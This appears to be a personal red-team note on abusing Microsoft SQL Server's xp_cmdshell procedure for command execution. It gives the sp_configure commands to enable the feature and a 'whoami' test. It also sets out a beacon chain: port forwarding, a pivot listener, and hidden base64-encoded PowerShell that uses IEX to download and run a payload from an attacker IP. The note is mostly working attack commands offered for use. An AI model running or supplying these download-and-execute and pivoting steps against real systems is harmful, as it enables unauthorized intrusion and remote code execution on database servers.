# SQL Command Execution
The **xp_cmdshell** procedure can be used to execute shell commands on the SQL server.

## Exploit
- [[PowerUpSQL#Command Execution]]
- Manually via [[HeidiSQL]] or [[mssqlclient]]
>EXEC xp_cmdshell 'whoami'; 
- Spawn a beacon with
>EXEC xp_cmdshell 'powershell -w hidden -enc [base64_content]';

```beacon
# Create a portforward from a beacon to kali
rportfwd 8080
# create a pivot listener on the beacon
wkstn1-pivot
# create scripted web delivery
/w1 delivering wkstn1-pivot, x64
# use IEX((...)) with replaced ip address
$str = 'IEX((new-object net.webclient).downloadstring("http://10.10.17.231:8080/w1"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str)) | clip
EXEC xp_cmdshell 'powershell -w hidden -enc SQBF[...snip...]AA==';
```

## Enable xp_cmdshell
#OPSEC reset to original state!

To enumerate the current state of xp_cmdshell, use:
>SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

 ![](/Images/Pasted%20image%2020220321170241.png)

>sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;


## Tools
########
########


```meta
ttp: T1000
requirements:
results: 
description: 
```